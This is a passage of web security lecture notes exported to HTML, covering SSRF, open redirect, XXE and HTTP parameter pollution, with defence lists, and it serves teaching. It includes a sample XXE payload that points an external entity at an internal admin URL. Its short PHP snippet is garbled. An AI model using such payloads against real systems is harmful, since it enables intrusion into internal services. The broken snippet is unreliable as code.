<li><b>Attack remote servers</b>: the confused back-end is fooled into sending malicious
requests to other remote servers, so that the attack is not coming from the
attacker’s machine;
</li>
<li><b>Bypass SOP</b>: the confused back-end is fooled into fetching malicious content
from the attacker’s server, hence the attacker gets scripting capabilities in
the server’s origin
</li>
</ol>
</div>
<div id="outline-container-sec-9-7-1" class="outline-4">
<h4 id="sec-9-7-1"><span class="section-number-4">9.7.1</span> Preventing SSRF: whitelisting</h4>
<div class="outline-text-4" id="text-9-7-1">
<p>
Some web applications only allow input that matches, begins with, or contains, a
whitelist of permitted values. This is preferable, however URL parsing should be
performed with care.
</p>
</div>
</div>
</div>
<div id="outline-container-sec-9-8" class="outline-3">
<h3 id="sec-9-8"><span class="section-number-3">9.8</span> Open redirect</h3>
<div class="outline-text-3" id="text-9-8">
<p>
An open redirect vulnerability happens when a web application redirects users to
an attacker-controlled URL. Normally has low severity, but it may become quite
dangerous in the context of SSRF.
</p>
</div>
</div>
<div id="outline-container-sec-9-9" class="outline-3">
<h3 id="sec-9-9"><span class="section-number-3">9.9</span> XML external entities</h3>
<div class="outline-text-3" id="text-9-9">
<p>
XML external entities is a web security vulnerability arising from the abuse of
little known, dangerous features of the XML format.
</p>

<p>
An external entity similarly binds a name to a URL:
</p>
<div class="org-src-container">

<pre class="src src-xml">&lt;?<span style="color: #fb4934;">xml</span> <span style="color: #dfd2b8;">version="1.0" encoding="utf-8"</span>?&gt;
&lt;!ENTITY server SYSTEM "http://stock.foo.com"&gt;
</pre>
</div>

<p>
Since an XML external entity can point to any URL, e.g., resolving to a local IP
address, it is possible to abuse XXE to perform SSRF:
</p>
<div class="org-src-container">

<pre class="src src-xml">&lt;?<span style="color: #fb4934;">xml</span> <span style="color: #dfd2b8;">version="1.0" encoding="utf-8"</span>?&gt;
&lt;?<span style="color: #fb4934;">xml</span> <span style="color: #dfd2b8;">version="1.0" encoding="UTF-8"</span>?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "http://192.168.0.68/admin"&gt;
]&gt;
&lt;<span style="color: #b8bb26;">stockCheck</span>&gt;&lt;<span style="color: #b8bb26;">productId</span>&gt;<span style="color: #d3869b;">&amp;</span><span style="color: #d3869b;">xxe</span><span style="color: #d3869b;">;</span>&lt;/<span style="color: #b8bb26;">productId</span>&gt;&lt;/<span style="color: #b8bb26;">stockCheck</span>&gt;
</pre>
</div>

<blockquote>
<p>
XXE can normally be used to obtain only files or responses that contain “valid”
XML that does not trigger parsing errors: for example, it cannot normally be
used to leak binary files!
</p>
</blockquote>
</div>
<div id="outline-container-sec-9-9-1" class="outline-4">
<h4 id="sec-9-9-1"><span class="section-number-4">9.9.1</span> Defending against XXE</h4>
<div class="outline-text-4" id="text-9-9-1">
<ul class="org-ul">
<li>disallow inline DTDs and use a static, local DTD if needed
</li>
<li>or at least disable XXE support: many modern XML parsing libraries already do
that, unless you explicitly relax this security restriction
</li>
<li>many libraries are vulnerable to the billion laugh attack by default!
</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-sec-9-10" class="outline-3">
<h3 id="sec-9-10"><span class="section-number-3">9.10</span> HTTP Parameter pollution</h3>
<div class="outline-text-3" id="text-9-10">
<p>
HTTP parameter pollution (HPP) is a vulnerability enabled by the HTTP parameter
parsing APIs of web programming languages.
</p>

<div class="org-src-container">

<pre class="src src-php">x =  = $_GET[’user’]
</pre>
</div>

<p>
What happens if the GET parameter contains two user parameters?
</p>
</div>
<div id="outline-container-sec-9-10-1" class="outline-4">
<h4 id="sec-9-10-1"><span class="section-number-4">9.10.1</span> Defending against HPP</h4>
<div class="outline-text-4" id="text-9-10-1">
<ul class="org-ul">
<li>check the documentation of your web development framework
</li>
<li>if the API gives you back a list of parameters, you already have all the
information you need
</li>
<li>otherwise, manually parse the parameters and check that none of them occurs multiple times
</li>
<li>encode the &amp; characters to avoid the discussed attack
</li>
</ul>
</div>
</div>
</div>
</div>
</div></div></div>
<footer id="postamble" class="">
<div><p class="author">Author: Pietro Visconti</p>
<p class="date">Created: 2024-05-21 Tue 17:22</p>
<p class="creator"><a href="http://www.gnu.org/software/emacs/">Emacs</a> 29.3 (<a href="http://orgmode.org">Org-mode</a> 9.7)</p>
</div>
</footer>
</body>
</html>
